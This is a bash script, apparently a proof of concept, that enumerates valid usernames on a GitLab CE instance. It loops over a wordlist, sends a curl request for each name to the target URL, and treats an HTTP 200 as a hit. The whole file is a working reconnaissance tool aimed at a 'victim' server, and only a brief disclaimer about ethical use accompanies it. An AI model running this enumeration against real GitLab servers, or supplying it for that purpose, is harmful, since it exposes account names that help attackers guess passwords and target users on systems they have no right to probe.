#!/bin/bash

#Colors
RED='\033[38;5;196m'
GREEN='\e[38;5;47m'
NC='\033[0m'
BOLD='\e[1m'
PINK='\e[38;5;198m'
Italic='\e[3m'
BBlue='\e[44m'
YELLOW='\033[0;33m'

clear
echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo -e "  			             ${BBlue}${BOLD}GitLab User Enumeration Script${NC}"
echo -e "   	    			             ${BOLD}Version 1.0${NC}\n"
echo -e "${BOLD}${PINK}Description: ${NC}It prints out the usernames that exist in your victim's GitLab CE instance\n"
echo -e "${BOLD}${PINK}Disclaimer: ${NC}${Italic}Do not run this script against ${BOLD}GitLab.com!${NC}${Italic} Also keep in mind that this PoC is meant only"
echo -e "for educational purpose and ethical use. Running it against systems that you do not own or have the"
echo -e "right permission is totally on your own risk.\n${NC}"
echo -e "${BOLD}${PINK}Author:${NC}${BOLD} @4DoniiS${NC}${Italic} [https://github.com/4D0niiS]${NC}"
echo -e "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
echo ""
echo ""



# Usage
usage() {
echo -e "${YELLOW}usage: ./gitlab_user_enum.sh --url <URL> --userlist <Username Wordlist>${NC}\n"

echo -e "${Italic}PARAMETERS:${NC}"
echo -e "-------------"
echo -e "-u/--url	The URL of your victim's GitLab instance"
echo -e "--userlist	Path to a username wordlist file (one per line)"
echo -e "-h/--help	Show this help message and exit"
echo -e "\n"
echo -e "${Italic}Example:${NC}"
echo -e "-------------"
echo -e "./gitlab_user_enum.sh --url http://gitlab.local/ --userlist /home/user/usernames.txt"
}

#check for params
args=("$@")
URL=""
user_list=""

for (( i=0; i < $#; i++))
{
	case ${args[$i]} in
	--url | -u)
	#GitLab's URL
	URL=${args[$((i+1))]}
	;;
	--userlist)
	#Username wordlist
	user_list=${args[$((i+1))]}
	;;
	-h | --help | "")
	#Help Menu
	usage
	exit 0
	;;
	esac
}


## checking the mandatory parameter (URL)
if [ -z "$URL" ]
then
    usage
    echo ""
    echo -e "${RED}${BOLD}The URL of your GitLab target (--url) is missing. ${NC}"
    exit 0
fi


# User Enumeration Function
enumeration(){

while IFS= read -r line
do
	echo "LOOP"
	HTTP_Code=$( curl -s -o /dev/null -w "%{http_code}" $URL/$line)
	echo $HTTP_Code
	#echo "\n"
	if [ $HTTP_Code -eq 200 ]
	then
 	 echo -e "${GREEN}${BOLD}[+]${NC} The username ${GREEN}${BOLD}$line ${NC}exists!"
	#check the connection
	elif [ $HTTP_Code -eq 000 ]
	then
	 echo -e "${BOLD}${RED}[!]${NC} The target is unreachable. Please make sure that you entered target's URL correctly and you have connection with it!"
	 exit 0
	fi

done < "$user_list"

}



# Main
enumeration